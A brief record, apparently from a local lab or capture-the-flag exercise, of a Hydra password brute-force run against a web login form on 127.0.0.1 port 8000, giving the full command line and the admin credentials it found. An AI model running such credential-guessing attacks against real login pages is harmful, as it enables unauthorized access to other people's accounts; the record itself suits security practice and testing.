
## Hydra brute-force result
Command used:
hydra -f -I -V -l admin -P passwords.txt -t 1 -s 8000 127.0.0.1 http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"

Result:
(login: admin   password: 12345admin) — valid credentials found.
